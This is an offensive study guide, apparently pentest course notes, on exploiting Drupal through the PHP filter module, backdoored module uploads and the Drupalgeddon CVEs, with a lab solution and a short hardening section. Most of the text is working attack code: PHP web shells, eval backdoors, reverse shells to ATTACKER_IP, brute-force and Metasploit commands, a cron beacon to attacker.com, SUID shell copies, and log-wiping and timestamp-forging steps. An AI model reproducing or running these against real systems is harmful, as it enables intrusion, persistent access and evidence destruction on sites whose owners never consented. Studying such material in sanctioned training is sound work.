# ⚔️ Drupal Attacks & Exploitation

> **🎯 Objective:** Master the exploitation of Drupal installations through PHP filter abuse, malicious module uploads, and Drupalgeddon vulnerability exploitation to achieve remote code execution and complete system compromise.

## Overview

Drupal exploitation presents unique challenges compared to WordPress and Joomla, requiring specialized techniques due to its **security-hardened architecture**. Unlike simpler CMS platforms, Drupal lacks direct theme file editing capabilities, necessitating alternative attack vectors through **PHP filter modules**, **backdoored module uploads**, and **core vulnerabilities**. This guide covers systematic exploitation from administrative access through complete system compromise.

**Primary Attack Vectors:**
- **🐘 PHP Filter Module** - Code execution via content creation (Drupal 6/7)
- **📦 Backdoored Module Upload** - Malicious module deployment for persistence
- **💥 Drupalgeddon Series** - Core vulnerability exploitation (CVE-2014-3704, CVE-2018-7600, CVE-2018-7602)
- **🔐 Administrative Abuse** - Built-in functionality exploitation

---

## PHP Filter Module Exploitation

### Understanding PHP Filter Module

#### Module Functionality & Versions
```bash
# PHP Filter Module Overview:
# Purpose: "Allows embedded PHP code/snippets to be evaluated"
# Availability: Default in Drupal 6/7, optional in Drupal 8+
# Risk Level: CRITICAL - Direct code execution capability

# Version Availability:
Drupal 6.x    → PHP Filter enabled by default
Drupal 7.x    → PHP Filter available but disabled by default  
Drupal 8.x+   → PHP Filter must be manually installed
```

#### Security Implications
```bash
# Why PHP Filter is dangerous:
1. Direct PHP code execution in content
2. Bypasses normal security restrictions
3. Full system access via web context
4. Persistent through content storage
5. Often overlooked in security reviews
```

### Drupal 7 PHP Filter Exploitation

#### Step 1: Administrative Access Verification
```bash
# Verify admin access to target
curl -c cookies.txt -d "name=admin&pass=password&form_id=user_login" \
  "http://drupal-qa.inlanefreight.local/user/login"

# Check session establishment
curl -b cookies.txt "http://drupal-qa.inlanefreight.local/admin" | grep -i "administration"
```

#### Step 2: PHP Filter Module Activation
**Navigation Path:**
1. **Administration** → **Modules** (`/admin/modules`)
2. **Find "PHP filter" module** in Filter section
3. **Enable checkbox** next to "PHP filter"
4. **Save configuration** at bottom of page

**Manual Verification:**
```bash
# Check if PHP filter is enabled
curl -b cookies.txt "http://drupal-qa.inlanefreight.local/admin/modules" | grep -i "php filter"

# Look for enabled status
curl -b cookies.txt "http://drupal-qa.inlanefreight.local/admin/modules" | grep 'checked.*php'
```

#### Step 3: Malicious Content Creation
**Navigation Path:**
1. **Content** → **Add content** (`/node/add`)
2. **Basic page** (for static content creation)
3. **Title:** Any legitimate-sounding title
4. **Body:** PHP payload injection
5. **Text format:** **PHP code** (critical setting)

**PHP Payload Examples:**
```php
# Professional web shell (recommended)
<?php
if (isset($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']) && 
    $_SERVER['HTTP_USER_AGENT'] === 'HTB-Assessment') {
    system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
}
?>

# Simple command execution
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>

# Alternative with output formatting
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

# Stealth version with base64
<?php
if (isset($_GET['data'])) {
    eval(base64_decode($_GET['data']));
}
?>
```

#### Step 4: Payload Execution & Testing
```bash
# Test code execution (assuming node/3 was created)
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id"

# Expected output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# System enumeration
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=uname+-a"

# Directory listing
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=ls+-la"

# Find flag files
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=find+/var/www+-name+'flag*'"
```

#### Step 5: Reverse Shell Establishment
```bash
# Setup listener on attacking machine
nc -nvlp 4444

# Bash reverse shell via URL encoding
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"

# Alternative: Python reverse shell
python_shell="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\"])'"

# URL encode and execute
curl -s "http://drupal-qa.inlanefreight.local/node/3" --data-urlencode "dcfdd5e021a869fcc6dfaef8bf31377e=$python_shell"
```

### Drupal 8+ PHP Filter Installation

#### Manual PHP Filter Module Installation
```bash
# Download PHP Filter module for Drupal 8+
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz

# Extract module
tar -xzf php-8.x-1.1.tar.gz
```

#### Installation via Admin Interface
**Navigation Path:**
1. **Administration** → **Reports** → **Available updates** (`/admin/reports/updates/install`)
2. **Install new module** section
3. **Upload archive file** → Browse to downloaded tar.gz
4. **Install** button to upload and activate

**Alternative URL Method:**
1. **Installation page** → **Install from a URL**
2. **URL:** `https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
3. **Install** to download and activate automatically

#### Post-Installation Configuration
```bash
# Navigate to Content → Add content → Basic page
# Ensure "PHP code" appears in Text format dropdown
# If not available, check module activation status

# Verify PHP filter availability
curl -b cookies.txt "http://target.com/admin/config/content/formats" | grep -i "php"
```

---

## Backdoored Module Upload Exploitation

### Understanding Drupal Module Architecture

#### Module Structure Analysis
```bash
# Standard Drupal module components:
module_name/
├── module_name.info.yml       # Module metadata
├── module_name.module         # Core functionality  
├── module_name.install        # Installation hooks
├── README.md                  # Documentation
├── LICENSE.txt                # Licensing information
└── src/                       # Source code (Drupal 8+)
```

#### Module Upload Requirements
```bash
# Prerequisites for module upload:
1. Administrative access to Drupal
2. "Administer modules" permission
3. Ability to upload files via web interface
4. Understanding of module packaging (tar.gz format)
```

### Creating Backdoored CAPTCHA Module

#### Step 1: Base Module Download
```bash
# Download legitimate CAPTCHA module
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz

# Extract contents
tar xvf captcha-8.x-1.2.tar.gz
cd captcha/

# Examine module structure
ls -la
```

#### Step 2: Web Shell Creation
```php
# Create shell.php in module directory
cat > shell.php << 'EOF'
<?php
// CAPTCHA module security enhancement (NOT!)
if (isset($_GET['fe8edbabc5c5c9b7b764504cd22b17af'])) {
    $cmd = $_GET['fe8edbabc5c5c9b7b764504cd22b17af'];
    
    // Basic input validation bypass
    if (strlen($cmd) > 0) {
        echo "<pre>";
        system($cmd);
        echo "</pre>";
    }
}
?>
EOF
```

#### Step 3: .htaccess Configuration
```apache
# Create .htaccess for module access
cat > .htaccess << 'EOF'
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>

# Allow access to PHP files in modules directory
<Files "*.php">
    Require all granted
</Files>
EOF
```

#### Step 4: Module Repackaging
```bash
# Move backdoor files into module directory
mv shell.php .htaccess captcha/

# Create backdoored archive
tar czf captcha-backdoored.tar.gz captcha/

# Verify archive contents
tar -tzf captcha-backdoored.tar.gz | grep -E "(shell\.php|\.htaccess)"
```

#### Step 5: Administrative Upload
**Navigation Path:**
1. **Manage** → **Extend** (`/admin/modules`)
2. **+ Install new module** button
3. **Browse** → Select `captcha-backdoored.tar.gz`
4. **Install** to upload and activate

**Post-Installation Verification:**
```bash
# Test web shell access
curl -s "http://target.com/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id"

# Expected output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# System reconnaissance
curl -s "http://target.com/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=ps+aux"
curl -s "http://target.com/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=netstat+-tulpn"
```

### Advanced Backdoored Module Techniques

#### Stealth Module Modification
```php
# Inject backdoor into existing module functionality
# Modify captcha/captcha.module

<?php
// Original CAPTCHA module code here...

// Stealth backdoor injection
if (isset($_GET['maintenance']) && $_GET['maintenance'] === 'debug_mode') {
    if (isset($_GET['exec'])) {
        eval($_GET['exec']);
        exit();
    }
}

// Continue with original module code...
?>
```

#### Database-Triggered Backdoors
```php
# Create database-triggered backdoor in module installation
# Add to captcha/captcha.install

function captcha_install() {
    // Original installation code...
    
    // Hidden backdoor activation
    if (isset($_SERVER['HTTP_X_CUSTOM_HEADER'])) {
        $decoded = base64_decode($_SERVER['HTTP_X_CUSTOM_HEADER']);
        if (strpos($decoded, 'exec:') === 0) {
            $cmd = substr($decoded, 5);
            system($cmd);
        }
    }
}
```

---

## Drupalgeddon Vulnerability Series

### CVE-2014-3704: Drupalgeddon 1 (SQL Injection)

#### Vulnerability Details
```bash
# CVE-2014-3704 Overview:
Affected Versions: Drupal 7.0 - 7.31
Fixed Version: Drupal 7.32
CVSS Score: 7.5 (High)
Attack Vector: Pre-authenticated SQL injection
Impact: Remote code execution, admin user creation
```

#### Manual Exploitation Process

**Vulnerability Mechanism:**
```bash
# SQL injection in user registration form
# Malicious arrays bypass input sanitization
# Allows arbitrary SQL execution
# Can create admin users or upload files
```

**Exploit Script Usage:**
```bash
# Download Drupalgeddon exploit
wget https://raw.githubusercontent.com/dreadlocked/Drupalgeddon/master/drupalgeddon.py

# Basic admin user creation
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

# Expected output:
[!] VULNERABLE!
[!] Administrator user created!
[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
```

**Post-Exploitation Steps:**
```bash
# 1. Login with created admin account
curl -c cookies.txt -d "name=hacker&pass=pwnd&form_id=user_login" \
  "http://drupal-qa.inlanefreight.local/user/login"

# 2. Enable PHP Filter module (if needed)
# Navigate to /admin/modules and enable PHP filter

# 3. Create malicious content with PHP execution
# Use techniques from PHP Filter section above
```

#### Metasploit Integration
```bash
# Use Metasploit module
msfconsole
use exploit/multi/http/drupal_drupageddon
set RHOSTS drupal-qa.inlanefreight.local
set TARGETURI /
exploit

# Automatic exploitation with reverse shell
```

### CVE-2018-7600: Drupalgeddon 2 (RCE)

#### Vulnerability Details
```bash
# CVE-2018-7600 Overview:
Affected Versions: Drupal 6.x, 7.x, 8.x (prior to 7.58, 8.5.1)
CVSS Score: 9.8 (Critical)
Attack Vector: Unauthenticated remote code execution
Impact: Complete system compromise
Mechanism: Insufficient input sanitization in user registration
```

#### Manual Exploitation

**Basic PoC Execution:**
```bash
# Download Drupalgeddon2 exploit
wget https://raw.githubusercontent.com/a2u/CVE-2018-7600/master/drupalgeddon2.py

# Test vulnerability with file upload
python3 drupalgeddon2.py
# Enter target URL when prompted: http://drupal-dev.inlanefreight.local/

# Verify file upload
curl -s http://drupal-dev.inlanefreight.local/hello.txt
# Expected output: ;-)
```

**PHP Web Shell Upload:**
```bash
# Create malicious PHP payload
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
# Output: PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K

# Modify exploit script to upload PHP shell
# Replace echo command in script with:
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php

# Execute modified exploit
python3 drupalgeddon2_modified.py
# Enter target URL: http://drupal-dev.inlanefreight.local/

# Test RCE via uploaded shell
curl "http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
```

**Advanced Payload Deployment:**
```bash
# Multi-stage payload for stealth
# Stage 1: Upload minimal dropper
echo '<?php file_put_contents("config.php", base64_decode($_GET["data"])); ?>' | base64

# Stage 2: Deploy full web shell via dropper
full_shell='<?php if(isset($_GET["cmd"])){echo "<pre>".shell_exec($_GET["cmd"])."</pre>";} ?>'
curl "http://target.com/dropper.php?data=$(echo $full_shell | base64 -w 0)"

# Stage 3: Execute commands via deployed shell
curl "http://target.com/config.php?cmd=whoami"
```

### CVE-2018-7602: Drupalgeddon 3 (Authenticated RCE)

#### Vulnerability Details
```bash
# CVE-2018-7602 Overview:
Affected Versions: Drupal 7.x, 8.x (multiple versions)
CVSS Score: 8.1 (High)
Attack Vector: Authenticated remote code execution
Requirements: User with node deletion permissions
Mechanism: Form API validation bypass
```

#### Prerequisites & Session Management

**Obtaining Valid Session:**
```bash
# Method 1: Credential brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt drupal-acc.inlanefreight.local http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login:Sorry"

# Method 2: Session hijacking (if applicable)
# Capture session cookies via network monitoring

# Method 3: Drupalgeddon 1/2 → session establishment
# Use previous exploits to create admin account
```

**Session Cookie Extraction:**
```bash
# Login and capture session
curl -c cookies.txt -d "name=admin&pass=password&form_id=user_login" \
  "http://drupal-acc.inlanefreight.local/user/login"

# Extract session cookie value
grep SESS cookies.txt | awk '{print $7}'
# Example: SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
```

#### Metasploit Exploitation

**Module Configuration:**
```bash
msfconsole
use exploit/multi/http/drupal_drupageddon3

# Basic target configuration
set RHOSTS 10.129.42.195
set VHOST drupal-acc.inlanefreight.local
set DRUPAL_SESSION SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
set DRUPAL_NODE 1

# Payload configuration
set LHOST ATTACKER_IP
set LPORT 4444

# Verify configuration
show options
```

**Exploitation Execution:**
```bash
# Execute exploit
exploit

# Expected results:
[*] Started reverse TCP handler on ATTACKER_IP:4444
[*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Sending stage (39264 bytes) to TARGET_IP
[*] Meterpreter session 1 opened

# Post-exploitation
meterpreter > getuid
Server username: www-data (33)

meterpreter > sysinfo
Computer    : app01
OS          : Linux app01 5.4.0-81-generic
```

---

## HTB Academy Lab Solutions

### Lab: Multi-Vector Drupal RCE Challenge
**Question:** "Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory."

**Comprehensive Solution Methodology:**

#### Step 1: Environment Setup & Target Analysis
```bash
# Add required VHost entries
echo "10.129.243.75 drupal-qa.inlanefreight.local" >> /etc/hosts
echo "10.129.243.75 drupal-dev.inlanefreight.local" >> /etc/hosts
echo "10.129.243.75 drupal.inlanefreight.local" >> /etc/hosts

# Verify connectivity to all targets
curl -I http://drupal-qa.inlanefreight.local/
curl -I http://drupal-dev.inlanefreight.local/
curl -I http://drupal.inlanefreight.local/

# Version enumeration for each target
curl -s http://drupal-qa.inlanefreight.local/CHANGELOG.txt | head -n 3
curl -s http://drupal-dev.inlanefreight.local/CHANGELOG.txt | head -n 3
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt | head -n 3
```

#### Step 2: Method 1 - PHP Filter Module (drupal-qa)

**Vulnerability Assessment:**
```bash
# Target: drupal-qa.inlanefreight.local
# Expected: Drupal 7.x with potential admin access

# Attempt default credential access
curl -c cookies.txt -d "name=admin&pass=admin&form_id=user_login" \
  "http://drupal-qa.inlanefreight.local/user/login"

# Verify admin access
curl -b cookies.txt "http://drupal-qa.inlanefreight.local/admin" | grep -i "administration"
```

**PHP Filter Exploitation:**
```bash
# Navigate to: /admin/modules
# Enable "PHP filter" module
# Navigate to: /node/add/page
# Create Basic page with PHP payload

# PHP payload for testing:
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>

# Test RCE after creating node (assuming node/3):
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id"

# Flag discovery:
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=find+/var/www+-name+'flag*'"
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=cat+/var/www/drupal.inlanefreight.local/flag.txt"
```

#### Step 3: Method 2 - Drupalgeddon 2 (drupal-dev)

**CVE-2018-7600 Exploitation:**
```bash
# Target: drupal-dev.inlanefreight.local
# Unauthenticated RCE vulnerability

# Download exploit script
wget https://raw.githubusercontent.com/a2u/CVE-2018-7600/master/drupalgeddon2.py

# Create custom PHP shell
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
# Result: PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K

# Modify exploit script payload section:
# Replace echo command with:
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee shell.php

# Execute modified exploit
python3 drupalgeddon2.py
# Enter URL: http://drupal-dev.inlanefreight.local/

# Test RCE via uploaded shell
curl "http://drupal-dev.inlanefreight.local/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id"

# Flag retrieval:
curl "http://drupal-dev.inlanefreight.local/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=cat+/var/www/drupal.inlanefreight.local/flag.txt"
```

#### Step 4: Method 3 - Drupalgeddon 1 (Admin Creation)

**CVE-2014-3704 Exploitation:**
```bash
# Target: drupal-qa.inlanefreight.local (if vulnerable to both)
# Or any Drupal 7.0-7.31 instance

# Download Drupalgeddon 1 exploit
wget https://raw.githubusercontent.com/dreadlocked/Drupalgeddon/master/drupalgeddon.py

# Create admin user
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

# Login with created user
curl -c cookies2.txt -d "name=hacker&pass=pwnd&form_id=user_login" \
  "http://drupal-qa.inlanefreight.local/user/login"

# Continue with PHP Filter or module upload methods
```

#### Step 5: Method 4 - Backdoored Module Upload

**CAPTCHA Module Backdoor:**
```bash
# Download legitimate CAPTCHA module
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

# Create backdoor files
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' > captcha/shell.php

cat > captcha/.htaccess << 'EOF'
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
EOF

# Repackage module
tar czf captcha-backdoored.tar.gz captcha/

# Upload via admin interface:
# /admin/modules → Install new module → Browse → captcha-backdoored.tar.gz

# Test backdoor access
curl "http://target.com/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
```

#### Step 6: Flag Discovery & Submission

**Systematic Flag Search:**
```bash
# Search all possible flag locations
locations=(
    "/var/www/drupal.inlanefreight.local/flag.txt"
    "/var/www/drupal.inlanefreight.local/flag"  
    "/var/www/flag.txt"
    "/var/www/html/flag.txt"
    "/flag.txt"
    "/root/flag.txt"
)

# Test each location via established RCE
for location in "${locations[@]}"; do
    echo "Checking: $location"
    curl -s "http://[COMPROMISED_HOST]/[SHELL_PATH]?[PARAM]=cat+$location"
done

# Alternative: Recursive search
curl -s "http://[COMPROMISED_HOST]/[SHELL_PATH]?[PARAM]=find+/var/www+-name+'*flag*'+-type+f"

# Final flag retrieval
curl -s "http://[COMPROMISED_HOST]/[SHELL_PATH]?[PARAM]=cat+/var/www/drupal.inlanefreight.local/flag.txt"
```

#### Step 7: Expected Flag Format & Cleanup

**Flag Submission:**
```bash
# HTB flags typically follow format: HTB{...}
# Example expected flag: HTB{dr8p4l_c0r3_v8ln3r4b1l1t13s}

# Post-exploitation cleanup:
# 1. Remove uploaded shells and backdoors
# 2. Disable PHP filter module (if enabled)
# 3. Delete created admin users (if applicable)  
# 4. Remove malicious content nodes
# 5. Document all changes in pentest report
```

---

## Advanced Exploitation Techniques

### Persistent Access Methods

#### Database-Level Persistence
```bash
# Access Drupal database via compromised shell
curl "http://target.com/shell.php?cmd=cat+/var/www/html/sites/default/settings.php" | grep database

# Extract database credentials
mysql -h localhost -u drupal_user -p'password' drupal_db

# Create persistent admin user via SQL
INSERT INTO users (name, mail, pass, status, created, access) 
VALUES ('sysadmin', 'admin@system.local', 
        '$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld', 
        1, UNIX_TIMESTAMP(), UNIX_TIMESTAMP());

# Add administrative privileges
INSERT INTO users_roles (uid, rid) 
SELECT uid, 3 FROM users WHERE name = 'sysadmin';
```

#### Crontab Persistence
```bash
# Establish cron-based backdoor
curl "http://target.com/shell.php?cmd=echo+'*/5+*+*+*+*+wget+-q+-O-+http://attacker.com/beacon+>+/dev/null'+|+crontab+-"

# Alternative: systemd timer (modern systems)
curl "http://target.com/shell.php?cmd=systemctl+--user+enable+backdoor.timer"
```

#### File System Persistence
```bash
# Hide backdoor in Drupal cache directory
curl "http://target.com/shell.php?cmd=echo+'<?php+eval(\$_GET[x]);?>'+>+/var/www/html/sites/default/files/.cache.php"

# Create hidden system service
curl "http://target.com/shell.php?cmd=cp+/bin/bash+/tmp/.system-update"
curl "http://target.com/shell.php?cmd=chmod+u+s+/tmp/.system-update"
```

### Defense Evasion Techniques

#### Log Cleaning & Anti-Forensics
```bash
# Clear web server access logs
curl "http://target.com/shell.php?cmd=echo+''>/var/log/apache2/access.log"
curl "http://target.com/shell.php?cmd=echo+''>/var/log/nginx/access.log"

# Clear system authentication logs
curl "http://target.com/shell.php?cmd=echo+''>/var/log/auth.log"
curl "http://target.com/shell.php?cmd=echo+''>/var/log/secure"

# Remove command history
curl "http://target.com/shell.php?cmd=history+-c"
curl "http://target.com/shell.php?cmd=unset+HISTFILE"
```

#### Timestamp Manipulation
```bash
# Preserve original file timestamps
curl "http://target.com/shell.php?cmd=stat+/var/www/html/index.php"
# Note original timestamp

# After modifications, restore timestamp
curl "http://target.com/shell.php?cmd=touch+-t+202301151430.00+/var/www/html/backdoor.php"
```

---

## Comprehensive Security Assessment

### Drupal-Specific Vulnerability Research

#### Core Vulnerability Timeline
```bash
# Major Drupal vulnerabilities by version:

Drupal 6.x:
- CVE-2014-3704 (Drupalgeddon)
- Multiple XSS vulnerabilities
- Session fixation issues

Drupal 7.x:
- CVE-2014-3704 (Drupalgeddon)
- CVE-2018-7600 (Drupalgeddon 2)
- CVE-2018-7602 (Drupalgeddon 3)
- CVE-2019-6340 (REST API RCE)

Drupal 8.x:
- CVE-2018-7600 (Drupalgeddon 2)
- CVE-2018-7602 (Drupalgeddon 3)
- CVE-2020-13671 (Access bypass)

Drupal 9.x:
- CVE-2021-32610 (Access bypass)
- Various information disclosure issues
```

#### Module-Specific Research
```bash
# High-risk contributed modules:
searchsploit "drupal views"
searchsploit "drupal webform" 
searchsploit "drupal ckeditor"
searchsploit "drupal media"

# Research methodology:
1. Identify installed modules via /admin/modules
2. Extract version numbers from .info files
3. Cross-reference with CVE databases
4. Test for known vulnerabilities
5. Analyze custom module security
```

### Professional Methodology Integration

#### Multi-Vector Assessment Workflow
```bash
# Phase 1: Discovery & Enumeration
1. Version fingerprinting (CHANGELOG.txt, meta tags)
2. Module enumeration (DroopeScan, manual)
3. User enumeration (registration, password reset)
4. Content discovery (node enumeration)

# Phase 2: Vulnerability Assessment  
5. Core vulnerability research (Drupalgeddon series)
6. Module vulnerability analysis (contrib modules)
7. Configuration assessment (PHP filter, permissions)
8. Custom code review (if accessible)

# Phase 3: Exploitation & Access
9. Credential attacks (brute force, default)
10. Core vulnerability exploitation
11. Module-specific attacks
12. Administrative functionality abuse

# Phase 4: Post-Exploitation & Persistence
13. System enumeration and privilege escalation
14. Database access and manipulation
15. Persistence mechanism deployment
16. Network pivoting and lateral movement
```

---

## Defensive Considerations

### Security Hardening Recommendations

#### Core Security Measures
```bash
# Essential Drupal security hardening:
1. Remove/rename update.php after updates
2. Disable PHP Filter module in production
3. Regular core and module updates
4. Strong administrative passwords
5. Two-factor authentication implementation
6. File permission hardening (644/755)
7. Database access restrictions
8. Web server security headers
```

#### Module Security Management
```bash
# Contributed module security:
1. Regular module updates via Drush/Composer
2. Remove unused/abandoned modules
3. Review module permissions regularly
4. Monitor Drupal security advisories
5. Test modules in staging environment
6. Implement module whitelisting
```

### Monitoring and Detection

#### Attack Pattern Recognition
```bash
# Monitor for Drupal-specific attacks:
- CHANGELOG.txt access attempts
- /admin path enumeration  
- Node parameter tampering
- PHP Filter module activation
- Unusual module uploads
- Database query anomalies
- File system modifications

# Log analysis for Drupal attacks:
tail -f /var/log/apache2/access.log | grep -E "(drupal|admin|node|php)"
```

#### Security Monitoring Implementation
```bash
# File integrity monitoring
find /var/www/drupal/ -name "*.php" -type f -exec md5sum {} \; > drupal_hashes.txt

# Database integrity checks
mysql -e "CHECKSUM TABLE users, users_roles;" drupal_database

# Module monitoring
drush pm-list --status=enabled > enabled_modules.txt
```

---

## Cross-Module Integration

### Integration with Other Attack Vectors

#### File Upload Integration
- **[File Upload Attacks](../file-upload-attacks/)** - Media module vulnerabilities
- **[File Inclusion](../file-inclusion/)** - Drupal file handling exploits

#### Database Attack Integration  
- **[SQL Injection](../databases/)** - Drupalgeddon and Form API attacks
- **[Database Enumeration](../databases/)** - Settings.php credential extraction

#### Command Injection Integration
- **[Command Injection](../command-injection/)** - PHP Filter and module RCE
- **[Web Shells](../shells-payloads/)** - Persistent access techniques

---

## Next Steps

After successful Drupal exploitation:

1. **[Servlet Containers](tomcat-enumeration.md)** - Java application server attacks
2. **[Development Tools](jenkins-enumeration.md)** - CI/CD infrastructure exploitation  
3. **[Infrastructure Applications](splunk-enumeration.md)** - Monitoring system attacks
4. **[Privilege Escalation](../../linux-privilege-escalation/)** - Local system compromise

**💡 Key Takeaway:** Drupal exploitation requires understanding of **security-hardened architecture**, **module-based attack vectors**, and **historical vulnerability patterns**. Unlike WordPress/Joomla, Drupal's enterprise focus demands specialized techniques including **PHP filter abuse**, **backdoored module deployment**, and **Drupalgeddon series exploitation** for successful compromise of critical infrastructure deployments. 